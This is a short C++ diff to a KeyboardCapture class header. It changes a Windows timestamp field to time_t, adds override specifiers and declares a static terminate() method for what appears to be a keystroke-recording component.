@@ -16,7 +16,7 @@ typedef struct:public Info{
     uint32_t vkcode = 0;
 #ifdef __WIN32__
     wchar_t descr[5] = {0};
-    std::wstring timestamp;
+    time_t timestamp;
 #else
     char descr[5] = {0};
     std::string timestamp;
@@ -26,8 +26,9 @@ typedef struct:public Info{
 class KeyboardCapture: public Capture {
 public:
     explicit KeyboardCapture();
-    ~KeyboardCapture();
-    void sql_action(const Info*);
+    ~KeyboardCapture() override;
+    void sql_action(const Info*) override;
+    static void terminate();
 private:
     std::string keyTable;
 
